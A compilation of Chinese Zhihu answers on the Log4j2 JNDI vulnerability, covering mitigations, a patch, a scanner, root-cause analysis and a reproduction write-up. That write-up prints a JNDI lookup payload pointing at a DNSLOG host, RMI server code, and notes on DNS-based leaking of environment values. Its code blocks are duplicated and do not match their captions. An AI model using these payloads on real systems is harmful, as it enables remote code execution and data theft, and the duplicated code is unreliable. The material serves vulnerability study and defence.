+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/80/v2-c77490ea93f5e2a34cde7e64f394ea93_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>尝试绕 2.15.0 最新版，用一些手法可以进入 serialize 的 if 判断，ldap 那边伪造类名可以绕这一层白名单，利用 classpath 里的 cc 触发 rce。但测试的时候没注意 ldap 是 localhost 已经在白名单，所以这个绕过没有意义。就算绕过了也无法处理默认关闭 lookup 的情况</p>
+<hr>
+<p>补充，今晚总结了一些无法 RCE 情况（RASP 或 SecurityManager 等技术）下这个漏洞应该如何利用，已发表到先知。主要是结合 SYS 和 ENV 用 DNSLOG 或 DNS 本身带出信息</p>
+<p>另外分析了一种特殊情况，有个 BundleLookup，在 SpringBoot 主动排除默认日志依赖选择 Log4j2 的情况下，可以直接读取数据库密码等关键配置信息</p>
+<p>最后水群从浅蓝师傅那里学到一种不出网的信息泄露回显方式，基于报错，在 Log4j2.xml 中开启某个特殊选项的情况下可以直接回显关键信息，在不出网的情况下获得信息。这个特殊选项在 Github 中有几千例且官方文档中也有很多处出现，所以实战中有概率可以利用</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-93733a11c84643dfb9180053c0003261_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<hr>
+<p>今天 Log4j2 发布了拒绝服务漏洞的 CVE 编号：<a href="https://link.zhihu.com/?target=https%3A//cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2021-45046">CVE-2021-45046</a></p>
+<p>这个漏洞我在 RC2 修复后立即报告了，但是官方并没有将该 CVE 的 credit 设置为我，而是国外某安全团队。经过这几天的努力，官方将我加入了 CVE-2021-45046 的 credit 中，算是人生第一个 apache 的 CVE 了</p>
+<p>仔细看了国外某安全团队的描述，他触发拒绝服务漏洞的方式和我提出的略有不同，他利用 ${ctx} 从 ThreadContext 里取值造成的拒绝服务，具体分析参考</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/10670">Apache Log4j2 拒绝服务漏洞分析</a></p>
+<h3 id=知乎用户--glavo-发表>知乎用户 Glavo 发表</h3>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/Glavo/log4j-patch">GitHub - Glavo/log4j-patch</a></p>
+<p>糊了一个简单有效的 patch 出来，将它附加在类路径的最前面即可禁用 JNDI 查找，阻止这个漏洞。适用于 Log4j2 所有版本，对 Java 版本没有要求。</p>
+<p>原理就是提供了一个空的 <code>JndiLookup</code> 用来覆盖 Log4j2 中的类，Log4j2 处理了加载失败的情况，会直接禁用 JNDI 查找，以此解决了这个问题。</p>
+<p>这是一个非侵入式的修补器，可以用来修补第三方无法修改代码的程序，譬如 Minecraft。这里提供了一个 javaagent，只需要添加 <code>-javaagent:log4j-patch-agent-1.0.jar</code> 就可以自动替换。</p>
+<p>这个也已经发布到 Maven Central 上了，自己的项目的话，将它作为第一个依赖项添加也能解决这个问题。</p>
+<pre tabindex=0><code>dependencies {
+    implementation(&quot;org.glavo:log4j-patch:1.0&quot;)
+}
+
+</code></pre><h3 id=知乎用户-微步在线-发表>知乎用户 微步在线​ 发表</h3>
+<p>近日, Apache Log4j2 的<a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266525850%7D">远程代码执行漏洞</a>细节被公开，经过快速分析和确认，该漏洞影响范围极其广泛，危害极其严重，<a href="https://www.zhihu.com/search?q=%E5%BE%AE%E6%AD%A5&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266525850%7D">微步</a>在线建议广大企业第一时间启动应急响应进行修复。</p>
+<h2 id=漏洞排查工具><strong>漏洞排查工具</strong></h2>
+<p>为帮助广大企业更好排查自身资产设备是否受该漏洞影响，经由微步工程师深入分析研究，现提供自查工具方便广大企业进行漏洞资产排查：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//static.threatbook.cn/tools/log4j-local-check.sh">https://static.threatbook.cn/tools/log4j-local-check.sh</a></p>
+<h3 id=工具原理><strong>工具原理</strong>：</h3>
+<p>首先通过读取系统中所有打开的文件，来读取所有加载了的 log4j 的 jar 包，然后识别 log4j 2.x 的 jar 包文件名特征，来识别出结果, 如果没检测出来，则对其他 jar 包进行正则匹配 log4j-core，看是否有引用该 jar 包，如果显示 jar 包路径，则说明存在该漏洞，没有则说明没有直接加载 log4j 对应 jar 包。</p>
+<h3 id=使用方法><strong>使用方法：</strong></h3>
+<p>chmod +x ./log4j-local-check.sh./log4j-local-check.sh</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-f9571a66584be6b26bb8aceb51b7a6f4_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=faq>FAQ</h2>
+<p>我们整理了一部分大家关注的问题进行答复，希望能帮助广大企业完成此次漏洞应急处理：</p>
+<ol>
+<li><strong>目前该漏洞具体受影响的版本都有哪些？</strong></li>
+</ol>
+<p>log4j2 2.0 - log4j2 2.15.0-rc1log4j 1.x，需配合 JMS Appender 才可被利用（该种利用方式目前尚未有公开信息）</p>
+<p><strong>2. 官方提供的 rc1 补丁是否确定已经被 bypass？</strong></p>
+<p>rc1 中漏洞 patch 方案虽被绕过，但 rc1 中 log4j2.formatMsgNoLookups 默认为 true，只要不修改该选项 rc1 依旧无法利用成功，不放心的用户也可更新至最新版：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p><strong>3. 应急修复方案：</strong></p>
+<p>对于 2.10 以下版本，建议升级至最新版 log4j-2.15.0-rc2</p>
+<p>对于 2.10 及以上版本版本，有如下缓解措施：</p>
+<ul>
+<li>设置 jvm 参数 “-Dlog4j2.formatMsgNoLookups=true”</li>
+<li>在项目 classpath 目录下添加 log4j2.component.properties 配置文件，设置 log4j2.formatMsgNoLookups=true</li>
+<li>设置系统环境变量：“LOG4J_FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS” 设置为 “true”</li>
+</ul>
+<p><strong>相关受影响的应用：</strong></p>
+<table>
+<thead>
+<tr>
+<th>应用</th>
+<th>受影响版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Spring-Boot-strater-log4j2</td>
+<td>全版本</td>
+</tr>
+<tr>
+<td>Apache Struts2</td>
+<td>全版本</td>
+</tr>
+<tr>
+<td>Apache Solr</td>
+<td>已经在 9.0 和 8.11.1 修复</td>
+</tr>
+<tr>
+<td>Apache Flink</td>
+<td>1.11.0-rc1 到 1.14.0</td>
+</tr>
+<tr>
+<td>Apache Druid</td>
+<td>0.7.x 以上</td>
+</tr>
+<tr>
+<td>Alibaba Druid</td>
+<td>1.0.15 以及以上</td>
+</tr>
+<tr>
+<td>ElasticSearch</td>
+<td>5.x，6.x 和 7.x</td>
+</tr>
+<tr>
+<td>Logstash</td>
+<td>5.0.0 至最新</td>
+</tr>
+<tr>
+<td>log4j2-redis-appender</td>
+<td>全版本</td>
+</tr>
+<tr>
+<td>Apache Dubbo</td>
+<td>2.7.x 以及 3.0.x</td>
+</tr>
+<tr>
+<td>Hadoop Hive</td>
+<td>2.x 和 3.x</td>
+</tr>
+<tr>
+<td>hadoop hbase</td>
+<td>3.0.0-alpha-1</td>
+</tr>
+<tr>
+<td>Mycat</td>
+<td>1.6.x</td>
+</tr>
+<tr>
+<td>OpenCms</td>
+<td>build_11_0_0_beta 到最新</td>
+</tr>
+</tbody>
+</table>
+<h3 id=知乎用户-淘小黑-发表>知乎用户 淘小黑 发表</h3>
+<p>这个漏洞在时间方面会比较长久，而且使用 log4j2 的项目比较多。对企业是一个持久的影响，现在已经又好多人开始利用这个漏洞攻击了。漏洞披露的时候没预料到会影响这么大。</p>
+<p>下列是目前已知的受影响项目，其中不乏主流的组件、框架以及应用服务。</p>
+<p>Apache Struts2</p>
+<p>Apache Solr</p>
+<p>Apache Druid</p>
+<p>Apache Flink</p>
+<p>ElasticSearch</p>
+<p>flume</p>
+<p>dubbo</p>
+<p>Redis</p>
+<p>logstash</p>
+<p>kafka</p>
+<p>&mldr;</p>
+<p>官方已出修复建议，可以参考。不过如非必要，建议直接将 jndi 移除，一劳永逸。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-22994084c66d3d23aca878c94596cfa9_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-看雪-发表>知乎用户 看雪 发表</h3>
+<p>本文为看雪论坛优秀文章</p>
+<p><a href="https://www.zhihu.com/search?q=%E7%9C%8B%E9%9B%AA%E8%AE%BA%E5%9D%9B&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2270811065%7D">看雪论坛</a>作者 ID：hacktu</p>
+<h2 id=一简介>一、<strong>简介</strong></h2>
+<p>被 log4j2 漏洞刷频了，公司也是紧急修复了一波，现在来整个盘一下这个漏洞到底是什么原理！</p>
+<p>测试漏洞的人太多，连 dnslog 很长一段时间都访问不了，最后还用的 ceye 测试复现的。</p>
+<p>**影响版本：**Apache Log4j 2.x&lt;=2.15.0.rc1</p>
+<p><strong>影响范围：</strong></p>
+<p>Spring-Boot-strater-log4j2Apache</p>
+<p>Struts2Apache</p>
+<p>SolrApache</p>
+<p>FlinkApache</p>
+<p>DruidElasticSearch</p>
+<p>Flume</p>
+<p>Dubbo</p>
+<p>Redis</p>
+<p>Logstash</p>
+<p>Kafka</p>
+<p>vmvare</p>
+<h2 id=二复现过程>二、<strong>复现过程</strong></h2>
+<h3 id=漏洞原理><strong>漏洞原理</strong></h3>
+<p>最主要的漏洞成因就是下面这张图了，log4j2 提供的 lookup 功能：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-98c75209c7ea513bc0050fafd98f16a7_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>日志中包含 ${}，lookup 功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2 将基本的解析都做了实现。比如常见的用户登陆日志记录：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-ff2845e51eccde4a8bbf82c37f07608b_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=常见解析><strong>常见解析</strong></h3>
+<pre tabindex=0><code>${ctx:loginId}
+${map:type}
+${filename}
+${date:MM-dd-yyyy}
+${docker:containerId}${docker:containerName}
+${docker:imageName}
+${env:USER}
+${event:Marker}
+${mdc:UserId}
+${java}
+${jndi:logging/context-name}
+${hostName}
+${docker:containerId}
+${k8s}
+${log4j}
+${main}
+${name}
+${marker}
+${spring}
+${sys:logPath}
+${web:rootDir}
+
+</code></pre><p>而其中的 JNDI（Java Naming and Directory Interface）就是本次的主题了，就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。</p>
+<p>而 log4j 2 中 JNDI 解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
+<p>也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用 JNDI 访问恶意对象，也就是流传出的 payload 构成：${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
+<p>我们可以将上面日志记录的代码简单修改一下，假设用户名是从外部获取的用户输入，此时构建一个恶意<a href="https://www.zhihu.com/search?q=%E7%94%A8%E6%88%B7%E5%90%8D&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2270811065%7D">用户名</a> ${jndi:ladp://<a href="https://link.zhihu.com/?target=http%3A//z2xcu7.dnslog.cn/exp">http://z2xcu7.dnslog.cn/exp</a>}，然后触发日志记录 (可以借助 DNSLog 生成临时域名用于查看测试是否生效）。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-9d9a17eb64a5cad557b88c9603ab8de7_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>可以看到，记录日志时发起了 JNDI 解析，访问了 DNS 提供的域名并生成记录。</p>
+<h3 id=攻击流程><strong>攻击流程</strong></h3>
+<p>其实 JNDI 通过 SPI（Service Provider Interface）封装了多个协议，包括 LDAP、RMI、DNS、NIS、NDS、RMI、CORBA；复现选择了使用 RMI 服务，搭建较为快速。</p>
+<h3 id=攻击思路文章中使用的-jdk18httpswwwzhihucomsearchqjdk18search_sourceentityhybrid_search_sourceentityhybrid_search_extra7b22sourcetype223a22answer222c22sourceid223a22708110657d><strong>攻击思路（文章中使用的 <a href="https://www.zhihu.com/search?q=jdk1.8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2270811065%7D">jdk1.8</a>）：</strong></h3>
+<p><strong>1、找到目标服务器记录日志的地方，且记录的部分内容可控。</strong></p>
+<p>我们还是选择之前的模拟日志记录，假设站点会记录用户登陆日志，实际上大部分网站确实会做相关功能。</p>
+<p><strong>2、搭建 RMI 服务端，包含需要执行的恶意代码。</strong></p>
+<p>RMI 服务端搭建，监听本地 8888（自定义）端口，用 Reference 类引用恶意对象。</p>
+<pre tabindex=0><code>package server;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+    public static void main(String\[\] args) throws RemoteException, NamingException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(8888);
+        System.out.println(&quot;Create RMI registry on port 8888&quot;);
+        Reference reference = new Reference(&quot;server.Log4jRCE&quot;, &quot;server.Log4jRCE&quot;, null);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;exp&quot;, referenceWrapper);
+    }
+}
+
+</code></pre><p>恶意对象模拟执行 cmd 打开计算器，并且输出一个语句用于标记执行处：</p>
+<pre tabindex=0><code>package server;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+    public static void main(String\[\] args) throws RemoteException, NamingException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(8888);
+        System.out.println(&quot;Create RMI registry on port 8888&quot;);
+        Reference reference = new Reference(&quot;server.Log4jRCE&quot;, &quot;server.Log4jRCE&quot;, null);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;exp&quot;, referenceWrapper);
+    }
+}
+
+</code></pre><p>执行 RMIServer，创建 RMI 服务。</p>
+<p><strong>3、构建 EXP 触发目标服务器进行日志记录触发 JNDI 解析。</strong></p>
+<p>构建恶意用户名模拟输入，执行触发恶意解析。</p>
+<pre tabindex=0><code>package server;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+    public static void main(String\[\] args) throws RemoteException, NamingException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(8888);
+        System.out.println(&quot;Create RMI registry on port 8888&quot;);
+        Reference reference = new Reference(&quot;server.Log4jRCE&quot;, &quot;server.Log4jRCE&quot;, null);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;exp&quot;, referenceWrapper);
+    }
+}
+
+</code></pre><p><strong>4、解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码。</strong></p>
+<p>恶意代码被执行，注意看恶意代码执行记录，是在日志记录的地方被执行。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-a902034d823bd85f32baa3d924b9995e_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=三修复与检测>三、<strong>修复与检测</strong></h2>
+<p>可以通过 ${jndi 字串匹配是否受到攻击。</p>
+<p>修复参考链接：</p>
+<p><em><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg">https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg</a></em></p>
+<p><em><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g">https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g</a></em></p>
+<h2 id=四总结>四、<strong>总结</strong></h2>
+<p>目前已证实服务器易受到漏洞攻击的公司包括苹果、亚马逊、特斯拉、谷歌、百度、腾讯、网易、京东、Twitter、 Steam 等。</p>
+<p>据统计，共有 6921 个<a href="https://www.zhihu.com/search?q=%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2270811065%7D">应用程序</a>都有被攻击的风险，其中《我的世界》首轮即被波及。就连修改 iPhone 手机名称都能触发，最主要的是这是国外黑客玩了几个月玩腻了才公开的漏洞！</p>
+<p>一个范围广的 0day 漏洞可能导致整个互联网沦为肉鸡或者瘫痪，网络安全，任重而道远。</p>
+<p>不过早在 11 月 24 日，阿里云就监测到了在野攻击并给 apache 报告了，只是 apache 新出的版本只是拦截了 ldap，其他协议依旧有效。所以公开后很快被腾讯团队测试可绕过，当天发出修复版本 Log4j 2.15.0-rc2。</p>
+<p>阅读原文：<a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/hlMbRl5EEtBe0-d3xvwyXg">Apache Log4j 2 漏洞原理及复现 (qq.com)</a></p>
+<h3 id=知乎用户--暴躁乐谷-发表>知乎用户 暴躁乐谷​​ 发表</h3>
+<p>有什么好说的呢，这是程序猿最常用的一个功能。其他的同类产品似乎都还好，就这个版本被人悄咪咪引入了对 jndi 的支持&mldr;</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-41e03314b9dfae061378590a20f53611_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<hr>
+<p>关于漏洞产生原因的分析：<br>
+- Q：从源代码看，为什么会引入这个漏洞？<br>
+- A：从作者提交的 patch 看，就是进行 Jndi 处理的时候忘记 return 了，这个 try / catch 之后没有 return&mldr; （很多越权漏洞也这样的原因）<br>
+- 主要支持 Jndi 的功能在这个文件 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commits/master/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java">https://github.com/apache/logging-log4j2/commits/master/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java</a><br>
+能不能绕过就看下面逻辑 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b">Handle URI exception · apache/logging-log4j2@c2b07e3</a></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-8c72294e96d52d77c95fce9260bb9aaf_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>- Q：什么时候开始有这个问题？<br>
+- A：14 年就有 JndiManager 的支持，而在日志里解析 Jndi 似乎是 16 年 2 月引入的，通过这里，起初目的是提供多种配置的方式：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commit/4226e8934a5440d0235d71033cff5e5056b6f20e%23diff-22ae074d2f9606392a3e3710b34967731a6ad3bc4012b42e0d362c9f87e0d65b">https://github.com/apache/logging-log4j2/commit/4226e8934a5440d0235d71033cff5e5056b6f20e#diff-22ae074d2f9606392a3e3710b34967731a6ad3bc4012b42e0d362c9f87e0d65b</a></p>
+<p>- Q：用户可控数据是怎么流入 org.apache.logging.log4j.core.net.JndiManager 的？<br>
+- A：通过类似于 Interceptor 的方式（切面）和参数转化器（Convertor），在这个补丁处有其他关键信息 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea%23diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51">https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea#diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51</a></p>
+<p>- Q：谁引入的这个问题？</p>
+<p>- A：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commit/4226e8934a5440d0235d71033cff5e5056b6f20e%23diff-22ae074d2f9606392a3e3710b34967731a6ad3bc4012b42e0d362c9f87e0d65b">https://github.com/apache/logging-log4j2/commit/4226e8934a5440d0235d71033cff5e5056b6f20e#diff-22ae074d2f9606392a3e3710b34967731a6ad3bc4012b42e0d362c9f87e0d65b</a></p>
+<h3 id=知乎用户--苏州棱镜七彩信息科技有限公司-发表>知乎用户 苏州棱镜七彩信息科技有限公司 发表</h3>
+<h2 id=快速定位-log4j-新漏洞影响的项目>快速定位 log4j 新漏洞影响的项目</h2>
+<p><strong>第一步</strong>：将 FossEye 知识库更新至最新版本</p>
+<p><strong>第二步</strong>：【项目管理】全量扫描代码仓库</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-d0b1519566a1748199302f12f7c9d058_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>第三步:</strong>【资产管理 - 漏洞】根据漏洞 id 搜索 “CVE-2021-44228”，点击查看影响项目数</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-fc506e0fd99554130fe81ecf81d71833_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>第四步:</strong> 溯源页面显示出该漏洞影响的所有项目，点击放大镜图标可查看代码具体位置</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-a9d43e0ca1af650054750f3a1ce6055e_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-218ff3ff3e76d620165b445d36fc2814_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=漏洞详情>漏洞详情</h2>
+<h3 id=漏洞概述><strong>漏洞概述</strong></h3>
+<p>此次 Apache Log4j2 漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。恶意攻击者可以利用该漏洞注入恶意 class 文件从而执行任意命令。</p>
+<h3 id=漏洞编号-1><strong>漏洞编号</strong></h3>
+<p>CVE-2021-44228</p>
+<p><strong>漏洞危险等级</strong></p>
+<p>严重</p>
+<h3 id=影响版本><strong>影响版本</strong></h3>
+<p>Apache Log4j &lt;=2.15.0-rc1</p>
+<p>可能的受影响应用包括但不限于如下：</p>
+<ul>
+<li>Spring-Boot-strater-log4j2</li>
+<li>Apache Struts2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+<li>ElasticSearch</li>
+<li>flume</li>
+<li>dubbo</li>
+<li>Redis</li>
+<li>logstash</li>
+<li>kafka</li>
+</ul>
+<h3 id=漏洞复现-1><strong>漏洞复现</strong></h3>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-5885a26dbd2ed1bda7315e1fadf2e824_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-1814cb6e1fd23103aefb33c8b7be09c6_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=漏洞分析><strong>漏洞分析</strong></h3>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-5885a26dbd2ed1bda7315e1fadf2e824_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>略去一些非关键流程，日志信息最终会进入 MessagePatternConverter.java 文件的 format 方法，如下图，<strong>当日志信息中出现 &ldquo;${&rdquo; 关键字 则通过 StrSubstitutor.java 的 replace 方法对其进行替换和解析</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-324e716d2fe412883ed7b93b526f4993_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>最终通过 StrSubstitutor.java 文件中的 substitute 方法对传入的日志信息进行替换。这个函数主要作用就是提取出日志信息中的 ${} 信息，并根据内容调用。varName 就是提取出来的关键信息，最关键的位置如下：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-6dbfbb611b888977433b5e11b2b3e5d9_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-9cdd7c28935108a703378f7c7df108ff_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>在 lookup 中，prefix 是对应配置类，name 是其参数并通过调用对应方法进行解析。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-37e461b2670d197ac16747a01b0c44f3_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>lookup 保存有如下解析类：</p>
+<p>![](data:image/svg+xml;utf8,)</p>
+<p>最终在 JndiLookup.java 中触发漏洞</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-1c0bf838335319b774a199b98e6adead_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><a href="https://www.zhihu.com/search?q=%E5%A0%86%E6%A0%88&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265213190%7D">堆栈</a>：</p>
+<p>lookup:172, JndiManager (<a href="https://link.zhihu.com/?target=http%3A//org.apache.logging.log4j.core.net">http://org.apache.logging.log4j.core.net</a>)<br>
+lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)<br>
+lookup:184, Interpolator (org.apache.logging.log4j.core.lookup)<br>
+resolveVariable:1054, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>
+substitute:976, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>
+substitute:872, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>
+replace:427, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>
+format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)<br>
+format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)<br>
+toSerializable:334, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)<br>
+toText:233, PatternLayout (org.apache.logging.log4j.core.layout)<br>
+encode:218, PatternLayout (org.apache.logging.log4j.core.layout)<br>
+encode:58, PatternLayout (org.apache.logging.log4j.core.layout)<br>
+directEncodeEvent:177, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)<br>
+tryAppend:170, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)<br>
+append:161, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)<br>
+tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)<br>
+callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)<br>
+callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)<br>
+callAppender:84, AppenderControl (org.apache.logging.log4j.<a href="https://www.zhihu.com/search?q=core.config&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265213190%7D">core.config</a>)<br>
+callAppenders:448, LoggerConfig (org.apache.logging.log4j.core.config)<br>
+processLogEvent:433, LoggerConfig (org.apache.logging.log4j.core.config)<br>
+log:417, LoggerConfig (org.apache.logging.log4j.core.config)<br>
+log:403, LoggerConfig (org.apache.logging.log4j.core.config)<br>
+log:49, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)<br>
+logMessage:146, Logger (org.apache.logging.log4j.core)<br>
+log:2117, AbstractLogger (org.apache.logging.log4j.spi)<br>
+tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)<br>
+logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)<br>
+logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)<br>
+logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)<br>
+logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)<br>
+error:740, AbstractLogger (org.apache.logging.log4j.spi)<br>
+main:14, log4j (com.z)</p>
+<h3 id=修复建议-1><strong>修复建议</strong></h3>
+<p>官方修复链接如下：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>临时解决方案（三选一）：</p>
+<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p>
+<p>（2） 修改配置 log4j2.formatMsgNoLookups=True</p>
+<p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</p>
+<h3 id=参考链接><strong>参考链接</strong></h3>
+<p><a href="https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2021-44228">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a><br>
